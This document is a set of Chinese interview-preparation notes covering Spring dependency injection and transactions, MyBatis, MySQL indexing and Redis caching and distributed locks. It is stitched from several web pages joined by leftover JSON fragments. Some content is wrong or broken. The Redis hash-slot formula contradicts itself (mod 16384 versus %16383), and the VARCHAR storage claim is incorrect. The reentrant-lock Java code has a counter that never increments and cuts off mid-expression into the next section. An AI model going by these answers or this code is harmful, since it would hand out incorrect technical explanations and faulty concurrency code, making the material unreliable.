02-有哪些不同类型的依赖注入实现方式？ 依赖注入分为接口注入，Setter方 法注入和构造器注入 构造器依赖注入：构造器依赖注入通过容器触发一个类的构造器来实现的，该类有一系列参数，每 个参数代表一个对其他类的依赖。 Setter方法注入：Setter方法注入是容器通过调用无参构造器或无参static工厂 方法实例化bean之 后，调用该bean的setter方法，即实现了基于setter的依赖注入。 03- Spring支持的几种bean的作用域 Scope Spring框架支持以下五种bean的作用域： singleton : bean在每个Spring ioc 容器中只有一个实例。 prototype：一个bean的定义可以有多个实例。 request：每次http请求都会创建一个bean，该作用域仅在基于web的Spring ApplicationContext情形下有效。 session：在一个HTTP Session中，一个bean定义对应一个实例。该作用域仅在基于web的 Spring ApplicationContext情形下有效。 global-session：在一个全局的HTTP Session中，一个bean定义对应一个实例。该作用域仅在基 于web的Spring ApplicationContext情形下有效。 04- Spring框架中的单例bean是线程安全的吗？ 不是，Spring框架中的单例bean不是线程安全的 , spring 中的 bean 默认是单例模式，spring 框架并没有对单例 bean 进行多线程的封装处理。 但是我们一般在使用单例Bean的时候, 不会设置共享数据, 所以也就不会存在线程安全问题 ! 从这个角度讲单例bean也是线程安全的 05- spring 自动装配 bean 有哪些方式？ 在Spring框架xml配置中共有5种自动装配： byName：通过bean的名称进行自动装配，如果一个bean的 property 与另一bean 的name 相 同，就进行自动装配。 byType：通过参数的数据类型进行自动装配。 constructor：利用构造函数进行装配，并且构造函数的参数通过byType进行装配。 06- Spring中的事务是如何实现的 Spring事务底层是基于数据库事务和AOP机制的 ⾸先对于使⽤了@Transactional注解的Bean，Spring会创建⼀个代理对象作为Bean 当调⽤代理对象的⽅法时，会先判断该⽅法上是否加了@Transactional注解 如果加了，那么则利⽤事务管理器创建⼀个数据库连接 并且修改数据库连接的autocommit属性为false，禁⽌此连接的⾃动提交，这是实现Spring事务⾮ 常重要的⼀步 然后执⾏当前⽅法，⽅法中会执⾏sql 执⾏完当前⽅法后，如果没有出现异常就直接提交事务 如果出现了异常，并且这个异常是需要回滚的就会回滚事务，否则仍然提交事务 Spring事务的隔离级别对应的就是数据库的隔离级别 Spring事务的传播机制是Spring事务⾃⼰实现的，也是Spring事务中最复杂的 Spring事务的传播机制是基于数据库连接来做的，⼀个数据库连接⼀个事务，如果传播机制配置为 需要新开⼀个事务，那么实际上就是先建⽴⼀个数据库连接，在此新数据库连接上执⾏sql 07- Spring中事务失效的场景 因为Spring事务是基于代理来实现的，所以某个加了@Transactional的⽅法只有是被代理对象调⽤时， 那么这个注解才会⽣效 , 如果使用的是被代理对象调用, 那么@Transactional会失效 同时如果某个⽅法是private的，那么@Transactional也会失效，因为底层cglib是基于⽗⼦类来实现 的，⼦类是不能重载⽗类的private⽅法的，所以⽆法很好的利⽤代理，也会导致@Transactianal失效 如果在业务中对异常进行了捕获处理 , 出现异常后Spring框架无法感知到异常, @Transactional也会失效 08- 说一下Spring的事务传播行为 PROPAGATION_REQUIRED：如果当前没有事务，就创建一个新事务，如果当前存在事务，就 加入该事务，该设置是最常用的设置。 PROPAGATION_SUPPORTS：支持当前事务，如果当前存在事务，就加入该事务，如果当前不 存在事务，就以非事务执行。 PROPAGATION_MANDATORY：支持当前事务，如果当前存在事务，就加入该事务，如果当前 不存在事务，就抛出异常。 PROPAGATION_REQUIRES_NEW：创建新事务，无论当前存不存在事务，都创建新事务。 PROPAGATION_NOT_SUPPORTED：以非事务方式执行操作，如果当前存在事务，就把当前 事务挂起。 PROPAGATION_NEVER：以非事务方式执行，如果当前存在事务，则抛出异常。 PROPAGATION_NESTED：如果当前存在事务，则在嵌套事务内执行。如果当前没有事务，则 按REQUIRED属性执行。 09- JDK动态代理和CGLIB动态代理的区别 Spring AOP中的动态代理主要有两种方式，JDK动态代理和CGLIB动态代理： JDK动态代理只提供接口的代理，不支持类的代理 Proxy.newProxyInstance(类加载器, 代理对象实现的所有接口, 代理执行器) CGLIB是通过继承的方式做的动态代理 , 如果某个类被标记为final，那么它是无法使用 CGLIB做动态代理的。 Enhancer.create(父类的字节码对象, 代理执行器) 10- 什么是AOP , 你们项目中有没有使用到AOP AOP一般称为面向切面编程，作为面向对象的一种补充，用于 将那些与业务无关，但却对多个对象产生影响的公共行为和逻辑，抽取并封装为一个可重用的模 块，这个模块被命名为“切面”（Aspect），减少系统中的重复代码，降低了模块间的耦合度，同时 提高了系统的可维护性。 在我们的项目中我们自己写AOP的场景其实很少 , 但是我们使用的很多框架的功能底层都是AOP , 例如 : 权限认证、日志、事务处理等 11- SpringMVC的执行流程知道嘛 用户发送请求至前端控制器DispatcherServlet； DispatcherServlet收到请求后，调用HandlerMapping处理器映射器，请求获取Handle； 处理器映射器根据请求url找到具体的处理器，生成处理器对象及处理器拦截器(如果有则生 成)一并返回给DispatcherServlet； DispatcherServlet 调用 HandlerAdapter处理器适配器； HandlerAdapter 经过适配调用具体处理器(Handler，也叫后端控制器)； Handler执行完成返回ModelAndView； HandlerAdapter将Handler执行结果ModelAndView返回给DispatcherServlet； DispatcherServlet将ModelAndView传给ViewResolver视图解析器进行解析； ViewResolver解析后返回具体View； DispatcherServlet对View进行渲染视图（即将模型数据填充至视图中） DispatcherServlet响应用户 12- Spring MVC常用的注解有哪些？ @RequestMapping：用于处理请求 url 映射的注解，可用于类或方法上。用于类上，则表示类中 的所有响应请求的方法都是以该地址作为父路径。 @RequestBody：注解实现接收http请求的json数据，将json转换为java对象。 @ResponseBody：注解实现将conreoller方法返回对象转化为json对象响应给客户。 @Controller：控制器的注解，表示是表现层,不能用用别的注解代替 @RestController : 组合注解 @Conntroller + @ResponseBody @GetMapping , @PostMapping , @PutMapping , @DeleteMapping ... @PathVariable : 接收请求路径中的变量 @RequestParam : 接收请求参数 13- Mybatis #{}和${}的区别 #{}是占位符，预编译处理；${}是拼接符，字符串替换，没有预编译处理。 Mybatis在处理#{}时，#{}传入参数是以字符串传入，会将SQL中的#{}替换为?号，调用 PreparedStatement的set方法来赋值。 #{} 可以有效的防止SQL注入，提高系统安全性；${} 不能防止SQL 注入 #{} 的变量替换是在数据库系统中； ${} 的变量替换是在 数据库系统外 14- Mybatis 如何获取生成的主键 我知道的有二种方式 在insert标签上, 使用useGeneratedKeys=\"true\" 和 keyProperty=\"userId\" 在insert表内部, 使用 selectKey标签 , 里面使用select last_insert_id()查询生成的ID返回 15- 当实体类中的属性名和表中的字段名不一样 ，怎么办 第1种： 通过在查询的SQL语句中定义字段名的别名，让字段名的别名和实体类的属性名一致。 第2种： 通过 ResultMap来映射字段名和实体类属性名 16- Mybatis如何实现多表查询 Mybatis是新多表查询的方式也有二种 : 第一种是 : 编写多表关联查询的SQL语句 , 使用ResultMap建立结果集映射 , 在ResultMap中建立多表结果集映射的标签有association和collection select a.*, username, birthday, sex, address from account a , user u where a.UID = u.id and a.ID = #{id} ; 第二种是 : 将多表查询分解为多个单表查询, 使用ResultMap表的子标签association和collection标签的select属性指定另外一条SQL的定义去执行, 然后执行结果会被自动封装 select * from account where id = #{id} 17-Mybatis都有哪些动态sql？能简述一下动 态sql的执行原理吗？ Mybatis动态sql可以让我们在Xml映射文件内，以标签的形式编写动态sql，完成逻辑判断和动态 拼接sql的功能，Mybatis提供了9种动态sql标签 trim|where|set|foreach|if|choose|when|otherwise|bind。 其执行原理为，使用OGNL从sql参数对象中计算表达式的值，根据表达式的值动态拼接sql，以此 来完成动态sql的功能。 18- Mybatis是否支持延迟加载？ Mybatis仅支持association关联对象和collection关联集合对象的延迟加载，association指的就是 一对一，collection指的就是一对多查询。在Mybatis配置文件中，可以配置是否启用延迟加载 lazyLoadingEnabled=true|false。 19- 如何使用Mybatis实现批量插入 ? 使用foreach标签 , 它可以在SQL语句中进行迭代一个集合。foreach标签的属性主 要有item，index，collection，open，separator，close。 collection : 代表要遍历的集合 , item   表示集合中每一个元素进行迭代时的别名，随便起的变量名； index   指定一个名字，用于表示在迭代过程中，每次迭代到的位置，不常用； open   表示该语句以什么开始 separator 表示在每次进行迭代之间以什么符号作为分隔符 close   表示以什么结束 20- Mybatis 批量插入是否能够返回主键 可以, 返回的主键在传入集合的每个对象属性中封装的 21- Mybatis的一级、二级缓存 ? 一级缓存: 基于SqlSession级别的缓存 , 默认开启 二级缓存 : 基于SqlSessionFactory的NameSpace级别缓存 , 默认没有开启, 需要手动开启 # 配置cacheEnabled为true ... ... # 在映射配置文件中配置cache相关配置 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-05-19 10:24 "},"面试必会篇/03-面试必会-Mysql篇.html":{"url":"面试必会篇/03-面试必会-Mysql篇.html","title":"03-面试必会-Mysql篇","keywords":"","body":"1. Mysql查询语句的书写顺序 Select [distinct ] from 表1 [ join 表2 on ] where group by having order by limit 2. Mysql查询语句的执行顺序 （8）Select （9）distinct 字段名1,字段名2， （7）[fun(字段名)]（1）from 表1 （3）join 表2 （2）on （4）where （5）group by （6）having （10）order by （11）limit 3. Mysql 如何实现多表查询 MYSQL多表查询主要使用连接查询 , 连接查询的方式主要有 : 内连接 隐式内连接 : Select 字段 From 表A , 表B where 连接条件 显式内连接 : Select 字段 From 表A inner join 表B on 连接条件 外连接 左外连接 : Select 字段 From 表A left join 表B on 连接条件 右外连接 : Select 字段 From 表A right join 表B on 连接条件 全外连接：(很少用) 交叉连接 : (很少用) 4. MYSQL内连接和外连接的区别 ? 内连接：只有两个元素表相匹配的才能在结果集中显示。 外连接：左外连接: 左边为驱动表，驱动表的数据全部显示，匹配表的不匹配的不会显示。 右外连接:右边为驱动表，驱动表的数据全部显示，匹配表的不匹配的不会显示。 全外连接：连接的表中不匹配的数据全部会显示出来。 交叉连接：笛卡尔效应，显示的结果是链接表数的乘积。 5. CHAR和VARCHAR的区别？ char的长度是不可变的，用空格填充到指定长度大小，而varchar的长度是可变的。 char的存取速度比varchar要快得多 char的存储方式是：对英文字符（ASCII）占用1个字节，对一个汉字占用两个字节。 varchar的存储方式是：对每个英文字符占用2个字节，汉字也占用2个字节。 6. 了解过Mysql的索引嘛 ? MYSQL索引主要有 : 单列索引 , 组合索引和空间索引 , 用的比较多的就是单列索引和组合索引 , 空间索引我这边没有用到过 单列索引 : 在MYSQL数据库表的某一列上面创建的索引叫单列索引 , 单列索引又分为 普通索引：MySQL中基本索引类型，没有什么限制，允许在定义索引的列中插入重复值和空值，纯粹为了查询数据更快一点。 唯一索引：索引列中的值必须是唯一的，但是允许为空值 主键索引：是一种特殊的唯一索引，不允许有空值 全文索引： 只有在MyISAM引擎、InnoDB（5.6以后）上才能使⽤用，而且只能在CHAR,VARCHAR,TEXT类型字段上使⽤用全⽂文索引。 组合索引 : 在MYSQL数据库表的多个字段组合上创建的索引 , 称为组合索引也叫联合索引 组合索引的使用，需要遵循左前缀原则 一般情况下，建议使用组合索引代替单列索引（主键索引除外） 7. 索引的底层数据结构了解过嘛 ? 索引是在存储引擎中实现的，也就是说不同的存储引擎，会使用不同的索引 MyISAM和InnoDB存储引擎：只⽀支持B+ TREE索引， 也就是说默认使用BTREE，不能够更换 MEMORY/HEAP存储引擎：支持HASH和BTREE索引 8. MYSQL支持的存储引擎有哪些, 有什么区别 ? MYSQL存储引擎有很多, 常用的就二种 : MyISAM和InnerDB , 者两种存储引擎的区别 ; MyISAM支持256TB的数据存储 , InnerDB只支持64TB的数据存储 MyISAM 不支持事务 , InnerDB支持事务 MyISAM 不支持外键 , InnerDB支持外键 9. 什么是聚簇索引什么是非聚簇索引 ? 聚簇索引 在使用InnoDB存储引擎的时候, 主键索引B+树叶子节点会存储数据行记录，简单来说数据和索引在一起存储 , 这就是聚簇索引 非聚簇索引 在使用MyISAM存储引擎的时候, B+树叶子节点只会存储数据行的指针，简单来说数据和索引不在一起 , 这就是非聚簇索引 10. 在一个非主键字段上创建了索引, 想要根据该字段查询到数据, 需要查询几次 ? 需要查询二次 如果使用MyISAM存储引擎 , 会首先根据索引查询到数据行指针, 再根据指针获取数据 如果是InnoDB存储引擎 , 会根据索引查找指定数据关联的主键ID , 再根据主键ID去主键索引中查找数据 11. 知道什么是回表查询嘛 ? 当我们为一张表的name字段建立了索引 , 执行如下查询语句 : select name,age from user where name='Alice' 那么获取到数据的过程为 : 根据name='Alice'查找索引树 , 定位到匹配数据的主键值为id=18 根据id=18到主索引获取数据记录 (回表查询) 先定位主键值，再定位行记录就是所谓的回表查询，它的性能较扫一遍索引树低 12. 知道什么叫覆盖索引嘛 ? 覆盖索引是指只需要在一棵索引树上就能获取SQL所需的所有列数据 , 因为无需回表查询效率更高 实现覆盖索引的常见方法是：将被查询的字段，建立到联合索引里去。 执行如下查询语句 : select name,age from user where name='Alice' 因为要查询 name和 age二个字段 , 那么我们可以建立组合索引 create index index_name_age on user(name,age) 那么索引存储结构如下 : 这种情况下, 执行select name,age from user where name='Alice' , 会先根据name='Alice', 找到记录 , 这条记录的索引上刚好又包含了 age 数据 , 直接把 Alice 77数据返回 , 就不会执行回表查询 , 这就是覆盖索引 13. 知道什么是左前缀原则嘛 ? 在mysql建立联合索引时会遵循左前缀匹配的原则，即最左优先，在检索数据时从联合索引的最左边开始匹配，组合索引的第一个字段必须出现在查询组句中，这个索引才会被用到 ; 例如 : create index index_age_name_sex on tb_user(age,name,sex); 上述SQL语句对 age,name和sex建一个组合索引index_age_name_sex,实际上这条语句相当于建立了(age) , (age,name) , (age,name,sex)三个索引 . select * from tb_user where age = 49 ; -- 使用索引 select * from tb_user where age = 49 and name = 'Alice' ; -- 使用索引 select * from tb_user where age = 49 and name = 'Alice' and sex = 'man'; -- 使用索引 select * from tb_user where age = 49 and sex = 'man'; -- 使用索引 , 但是只有 age 匹配索引 sex没有走索引 select * from tb_user where name = 'Alice' and age = 49 and sex = 'man' ; -- 使用索引 , 因为MySQL的查询优化器会自动调整 where 子句的条件顺序以使用适合的索引 select * from tb_user where name = 'Alice' and sex = 'man' ; -- 不会使用索引 14. 什么情况下索引会失效 ? MySQL 索引通常是被用于提高 WHERE 条件的数据行匹配时的搜索速度，编写合理化的SQL能够提高SQL的执行效率 不要在列上使用函数和进行运算 不要在列上使用函数，这将导致索引失效而进行全表扫描。 尽量避免使用 != 或 not in或 <> 等否定操作符 尽量避免使用 or 来连接条件 多个单列索引并不是最佳选择，建立组合索引代替多个单列索引, 可以避免回表查询 查询中的某个列有范围查询，则其右边所有列都无法使用索引优化查找 索引不会包含有NULL值的列 当查询条件左右两侧类型不匹配的时候会发生隐式转换，隐式转换带来的影响就是可能导致索引失效而进行全表扫描。 like 语句的索引失效问题 like 的方式进行查询，在 like “value%” 可以使用索引，但是对于 like “%value%” 这样的方式，执行全表查询 15. 索引是越多越好嘛? 什么样的字段需要建索引, 什么样的字段不需要 ? 需要创建索引情况 主键自动建立主键索引 频繁作为查询条件的字段应该创建索引 多表关联查询中，关联字段应该创建索引 (on 两边都要创建索引) 查询中排序的字段，应该创建索引 频繁查找字段 , 应该创建索引 查询中统计或者分组字段，应该创建索引 不要创建索引情况 表记录太少 经常进⾏行行增删改操作的表 频繁更新的字段 where条件里使用频率不高的字段 16. mysql的性能优化 从设计方面 选择合适的存储引擎 , 合适的字段类型 , 遵循范式(反范式设计) 存储引擎 : 不需要事务, 不需要外键读写较多的的使用MyIsam 需要事务, 需要外键的使用InnoDB 合适的字段类型 , 例如 : 定长字符串用char , 不定长用varchr 状态, 性别等有限数量值的用tinyint 遵循范式 : 第一范式1NF，原子性 第二范式2NF，消除部分依赖 第三范式3NF，消除传递依赖 2.从功能方面可以对索引优化，采用缓存缓解数据库压力，分库分表。 3.从架构方面可以采用主从复制，读写分离，负载均衡 17. MYSQL超大分页怎么处理 ? MYSQL 不是跳过offset行, 而是取offset+N行, 然后放弃前offset行 , 返回N行, 所以当offset比较法的情况下分页效率很低 正确的处理方法是 : 先快速定位需要获取的id再关联查询获取数据 18. 如何定位慢查询 ? 可以在MYSQL配置文件中开启慢查询 , 有两种方式可以开启慢查询 方式一 : 修改my.ini配置文件 , 重启 MySQL 生效 [mysqld] log_output='FILE,TABLE' slow_query_log='ON' long_query_time=0.001 方式二 : 设置全局变量 SET GLOBAL slow_query_log = 'ON'; SET GLOBAL log_output = 'FILE,TABLE'; SET GLOBAL long_query_time = 0.001; 19. 一个SQL语句执行很慢, 如何分析 首先可以开启慢查询, 通过慢查询日志或者命令, 获取到执行慢的SQL语句 , 其次可以使用EXLPAIN命令分析SQL语句的执行过程 EXLPAIN命令, 比较重要的字段(加黑加粗的是重要的) : select_type重点解读 type重点解读：查询性能从上到下依次是最好到最差 extra重点解读 20. Mysql锁和分库分表 有精力看看下发的资料和文档, 没精力直接说没搞过 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-05-21 12:19 "},"面试必会篇/04-面试必会-Redis篇.html":{"url":"面试必会篇/04-面试必会-Redis篇.html","title":"04-面试必会-Redis篇","keywords":"","body":"01- 你们项目中哪里用到了Redis ? 在我们的项目中很多地方都用到了Redis , Redis在我们的项目中主要有三个作用 : 使用Redis做热点数据缓存/接口数据缓存 使用Redis存储一些业务数据 , 例如 : 验证码 , 用户信息 , 用户行为数据 , 数据计算结果 , 排行榜数据等 使用Redis实现分布式锁 , 解决并发环境下的资源竞争问题 02- Redis的常用数据类型有哪些 ? Redis 有 5 种基础数据结构，它们分别是：string(字符串)、list(列表)、hash(字典)、set(集 合) 和 zset(有序集合) 03- Redis的数据持久化策略有哪些 ? Redis 提供了两种方式，实现数据的持久化到硬盘。 RDB 持久化(全量)，是指在指定的时间间隔内将内存中的数据集快照写入磁盘。 AOF持久化(增量)，以日志的形式记录服务器所处理的每一个写、删除操作 RDB和AOF一起使用, 在Redis4.0版本支持混合持久化方式 ( 设置 aof-use-rdb-preamble yes ) 04- Redis的数据过期策略有哪些 ? 惰性删除 ：只会在取出 key 的时候才对数据进行过期检查。这样对 CPU 最友好，但是可能会造成太多过期 key 没有被删除。 数据到达过期时间，不做处理。等下次访问该数据时，我们需要判断 如果未过期，返回数据 发现已过期，删除，返回nil 定期删除 ： 每隔一段时间抽取一批 key 执行删除过期 key 操作。并且，Redis 底层会通过限制删除操作执行的时长和频率来减少删除操作对 CPU 时间的影响。 默认情况下 Redis 定期检查的频率是每秒扫描 10 次，用于定期清除过期键。当然此值还可以通过配置文件进行设置，在 redis.conf 中修改配置“hz”即可，默认的值为hz 10 定期删除的扫描并不是遍历所有的键值对，这样的话比较费时且太消耗系统资源。Redis 服务器采用的是随机抽取形式，每次从过期字典中，取出 20 个键进行过期检测，过期字典中存储的是所有设置了过期时间的键值对。如果这批随机检查的数据中有 25% 的比例过期，那么会再抽取 20 个随机键值进行检测和删除，并且会循环执行这个流程，直到抽取的这批数据中过期键值小于 25%，此次检测才算完成 Redis 服务器为了保证过期删除策略不会导致线程卡死，会给过期扫描增加了最大执行时间为 25ms 定期删除对内存更加友好，惰性删除对 CPU 更加友好。两者各有千秋，所以 Redis 采用的是 定期删除+惰性删除 05- Redis的数据淘汰策略有哪些 ? Redis 提供 8 种数据淘汰策略： 淘汰易失数据(具有过期时间的数据) volatile-lru（least recently used）：从已设置过期时间的数据集（server.db[i].expires）中挑选最近最少使用的数据淘汰 volatile-lfu（least frequently used）：从已设置过期时间的数据集（server.db[i].expires）中挑选最不经常使用的数据淘汰 volatile-ttl：从已设置过期时间的数据集（server.db[i].expires）中挑选将要过期的数据淘汰 volatile-random：从已设置过期时间的数据集（server.db[i].expires）中任意选择数据淘汰 淘汰全库数据 allkeys-lru（least recently used）：当内存不足以容纳新写入数据时，在键空间中，移除最近最少使用的 key（这个是最常用的） allkeys-lfu（least frequently used）：当内存不足以容纳新写入数据时，在键空间中，移除最不经常使用的 key allkeys-random：从数据集（server.db[i].dict）中任意选择数据淘汰 不淘汰 no-eviction：禁止驱逐数据，也就是说当内存不足以容纳新写入数据时，新写入操作会报错。这个应该没人使用吧！ 06- 你们使用Redis是单点还是集群 ? 哪种集群 ? 我们Redis使用的是哨兵集群 , 一主二从 , 三个哨兵 , 三台Linux机器 07- Redis集群有哪些方案, 知道嘛 ? 我所了解的Redis集群方案 主从复制集群 : 读写分离, 一主多从 , 解决高并发读的问题 哨兵集群 : 主从集群的结构之上 , 加入了哨兵用于监控集群状态 , 主节点出现故障, 执行主从切换 , 解决高可用问题 Cluster分片集群 : 多主多从 , 解决高并发写的问题, 以及海量数据存储问题 , 每个主节点存储一部分集群数据 08- 什么是 Redis 主从同步？ Redis 的主从同步(replication)机制，允许 Slave 从 Master 那里，通过网络传输拷贝到完整的数据备份，从而达到主从机制。 主数据库可以进行读写操作，当发生写操作的时候自动将数据同步到从数据库，而从数据库一般是只读的，并接收主数据库同步过来的数据。一个主数据库可以有多个从数据库，而一个从数据库只能有一个主数据库。 主从数据同步主要分二个阶段 : 第一阶段 : 全量复制阶段 slave节点请求增量同步 master节点判断replid，发现不一致，拒绝增量同步 master将完整内存数据生成RDB，发送RDB到slave slave清空本地数据，加载master的RDB 第二阶段 : 增量复制阶段 master将RDB期间的命令记录在repl_baklog，并持续将log中的命令发送给slave slave执行接收到的命令，保持与master之间的同步 09- Redis分片集群中数据是怎么存储和读取的 ? Redis集群采用的算法是哈希槽分区算法。Redis集群中有16384个哈希槽（槽的范围是 0 -16383，哈希槽），将不同的哈希槽分布在不同的Redis节点上面进行管理，也就是说每个Redis节点只负责一部分的哈希槽。在对数据进行操作的时候，集群会对使用CRC16算法对key进行计算并对16384取模（slot = CRC16(key)%16383），得到的结果就是 Key-Value 所放入的槽，通过这个值，去找到对应的槽所对应的Redis节点，然后直接到这个对应的节点上进行存取操作 10- 你们用过Redis的事务吗 ? 事务的命令有哪些 ? Redis 作为 NoSQL 数据库也同样提供了事务机制。在 Redis 中，MULTI / EXEC / DISCARD / WATCH 这四个命令事务的相关操作命令 我们在开发过程中基本上没有用到过Redis的事务 11- Redis 和 Memcached 的区别有哪些？ Redis 提供复杂的数据结构，丰富的数据操作 , Memcached 仅提供简单的字符串。 Redis原生支持集群模式 , Memcached不支持原生集群 Memcached 不支持持久化存储，重启时，数据被清空, Redis 支持持久化存储，重启时，可以恢复已持久化的数据 12- Redis的内存用完了会发生什么？ 如果达到设置的上限，Redis 的写命令会返回错误信息（ 但是读命令还可以正常返回。） 也可以配置内存淘汰机制， 当 Redis 达到内存上限时会冲刷掉旧的内容。 13- Redis和Mysql如何保证数据⼀致? 先更新Mysql，再更新Redis，如果更新Redis失败，可能仍然不⼀致 先删除Redis缓存数据，再更新Mysql，再次查询的时候在将数据添加到缓存中 这种⽅案能解决1 ⽅案的问题，但是在⾼并发下性能较低，⽽且仍然会出现数据不⼀致的问题， ⽐如线程1删除了 Redis缓存数据，正在更新Mysql， 此时另外⼀个查询再查询，那么就会把Mysql中⽼数据⼜查到 Redis中 使用MQ异步同步, 保证数据的最终一致性 我们项目中会根据业务情况 , 使用不同的方案来解决Redis和Mysql的一致性问题 : 对于一些一致性要求不高的场景 , 不做处理 例如 : 用户行为数据 , 我们没有做一致性保证 , 因为就算不一致产生的影响也很小 对于时效性数据 , 设置过期时间 例如 : 接口缓存数据 , 我们会设置缓存的过期时间为 60S , 那么可能会出现60S之内的数据不一致, 60S后缓存过期, 重新从数据库加载就一致了 对于一致性要求比较高但是时效性要求不那么高的场景 , 使用MQ不断发送消息完成数据同步直到成功为止 例如 : 首页广告数据 , 首页推荐数据 数据库数据发生修改----> 发送消息到MQ -----> 接收消息更新缓存 消息不丢失/重复消费 : 消息状态表/消息消费表 对于一致性和时效性要求都比较高的场景 , 使用分布式事务 , Seata的TCC模式 很少用 14- 什么是缓存穿透 ? 怎么解决 ? 缓存穿透是指查询一条数据库和缓存都没有的一条数据，就会一直查询数据库，对数据库的访问压力就会增大，缓存穿透的解决方案 有以下2种解决方案 ： 缓存空对象：代码维护较简单，但是效果不好。 布隆过滤器：代码维护复杂，效果很好 15- 什么是缓存击穿 ? 怎么解决 ? 缓存击穿是指缓存中没有但数据库中有的数据（一般是缓存时间到期），这时由于并发用户特别多，同时读缓存没读到数据，又同时去数据库去取数据，引起数据库压力瞬间增大 解决方案 : 热点数据提前预热 设置热点数据永远不过期。 加锁 , 限流 16- 什么是缓存雪崩 ? 怎么解决 ? 缓存雪崩/缓存失效 指的是大量的缓存在同一时间失效，大量请求落到数据库 导致数据库瞬间压力飙升。 造成这种现象的 原因是，key的过期时间都设置成一样了。 解决方案是，key的过期时间引入随机因素 17- 数据库有1000万数据 ,Redis只能缓存20w数据, 如何保证Redis中的数据都是热点数据 ? 配置Redis的内容淘汰策略为LFU算法 , 这样会把使用频率较低的数据淘汰掉 , 留下的数据都是热点数据 18- Redis分布式锁如何实现 ? Redis分布式锁主要依靠一个SETNX指令实现的 , 这条命令的含义就是“SET if Not Exists”，即不存在的时候才会设置值。 只有在key不存在的情况下，将键key的值设置为value。如果key已经存在，则SETNX命令不做任何操作。 这个命令的返回值如下。 命令在设置成功时返回1。 命令在设置失败时返回0。 假设此时有线程A和线程B同时访问临界区代码，假设线程A首先执行了SETNX命令，并返回结果1，继续向下执行。而此时线程B再次执行SETNX命令时，返回的结果为0，则线程B不能继续向下执行。只有当线程A执行DELETE命令将设置的锁状态删除时，线程B才会成功执行SETNX命令设置加锁状态后继续向下执行 Boolean isLocked = stringRedisTemplate.opsForValue().setIfAbsent(PRODUCT_ID, \"binghe\"); 当然我们在使用分布式锁的时候也不能这么简单, 会考虑到一些实际场景下的问题 , 例如 : 死锁问题 在使用分布式锁的时候, 如果因为一些原因导致系统宕机, 锁资源没有被释放, 就会产生死锁 解决的方案 : 上锁的时候设置锁的超时时间 Boolean isLocked = stringRedisTemplate.opsForValue().setIfAbsent(PRODUCT_ID, \"binghe\", 30, TimeUnit.SECONDS); 锁超时问题 如果业务执行需要的时间, 超过的锁的超时时间 , 这个时候业务还没有执行完成, 锁就已经自动被删除了 其他请求就能获取锁, 操作这个资源 , 这个时候就会出现并发问题 , 解决的方案 : 引入Redis的watch dog机制, 自动为锁续期 开启子线程 , 每隔20S运行一次, 重新设置锁的超时时间 归一问题 如果一个线程获取了分布式锁, 但是这个线程业务没有执行完成之前 , 锁被其他的线程删掉了 , 又会出现线程并发问题 , 这个时候就需要考虑归一化问题 就是一个线程执行了加锁操作后，后续必须由这个线程执行解锁操作，加锁和解锁操作由同一个线程来完成。 为了解决只有加锁的线程才能进行相应的解锁操作的问题，那么，我们就需要将加锁和解锁操作绑定到同一个线程中，可以使用ThreadLocal来解决这个问题 , 加锁的时候生成唯一标识保存到ThreadLocal , 并且设置到锁的值中 , 释放锁的时候, 判断线程中的唯一标识和锁的唯一标识是否相同, 只有相同才会释放 public class RedisLockImpl implements RedisLock{ @Autowired private StringRedisTemplate stringRedisTemplate; private ThreadLocal threadLocal = new ThreadLocal(); @Override public boolean tryLock(String key, long timeout, TimeUnit unit){ String uuid = UUID.randomUUID().toString(); threadLocal.set(uuid); return stringRedisTemplate.opsForValue().setIfAbsent(key, uuid, timeout, unit); } @Override public void releaseLock(String key){ //当前线程中绑定的uuid与Redis中的uuid相同时，再执行删除锁的操作 if(threadLocal.get().equals(stringRedisTemplate.opsForValue().get(key))){ stringRedisTemplate.delete(key); } } } 可重入问题 当一个线程成功设置了锁标志位后，其他的线程再设置锁标志位时，就会返回失败。 还有一种场景就是在一个业务中, 有个操作都需要获取到锁, 这个时候第二个操作就无法获取锁了 , 操作会失败 例如 : 下单业务中, 扣减商品库存会给商品加锁, 增加商品销量也需要给商品加锁 , 这个时候需要获取二次锁 第二次获取商品锁就会失败 , 这就需要我们的分布式锁能够实现可重入 实现可重入锁最简单的方式就是使用计数器 , 加锁成功之后计数器 + 1 , 取消锁之后计数器 -1 , 计数器减为0 , 真正从Redis删除锁 public class RedisLockImpl implements RedisLock{ @Autowired private StringRedisTemplate stringRedisTemplate; private ThreadLocal threadLocal = new ThreadLocal(); private ThreadLocal threadLocalInteger = new ThreadLocal(); @Override public boolean tryLock(String key, long timeout, TimeUnit unit){ Boolean isLocked = false; if(threadLocal.get() == null){ String uuid = UUID.randomUUID().toString(); threadLocal.set(uuid); isLocked = stringRedisTemplate.opsForValue().setIfAbsent(key, uuid, timeout, unit); }else{ isLocked = true; } //加锁成功后将计数器加1 if(isLocked){ Integer count = threadLocalInteger.get() == null ? 0 : threadLocalInteger.get(); threadLocalInteger.set(count++); } return isLocked; } @Override public void releaseLock(String key){ //当前线程中绑定的uuid与Redis中的uuid相同时，再执行删除锁的操作 if(threadLocal.get().equals(stringRedisTemplate.opsForValue().get(key))){ Integer count = threadLocalInteger.get(); //计数器减为0时释放锁 if(count == null || --count 阻塞与非阻塞问题 在使用分布式锁的时候 , 如果当前需要操作的资源已经加了锁, 这个时候会获取锁失败, 直接向用户返回失败信息 , 用户的体验非常不好 , 所以我们在实现分布式锁的时候, 我们可以将后续的请求进行阻塞，直到当前请求释放锁后，再唤醒阻塞的请求获得分布式锁来执行方法。 具体的实现就是参考自旋锁的思想, 获取锁失败自选获取锁, 直到成功为止 , 当然为了防止多条线程自旋带来的系统资料消耗, 可以设置一个自旋的超时时间 , 超过时间之后, 自动终止线程 , 返回失败信息 19- 你的项目中哪里用到了分布式锁 在我最近做的一个项目中 , 我们在任务调度的时候使用了分布式锁 早期我们在进行定时任务的时候我们采用的是SpringTask实现的 , 在集群部署的情况下, 多个节点的定时任务会同时执行 , 造成重复调度 , 影响运算结果, 浪费系统资源 这里为了防止这种情况的发送, 我们使用Redis实现分布式锁对任务进行调度管理 , 防止重复任务执行 后期因为我们系统中的任务越来越多 , 执行规则也比较多 , 而且单节点执行效率有一定的限制 , 所以定时任务就切换成了XXL-JOB , 系统中就没有再使用分布式锁了 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-05-27 11:23 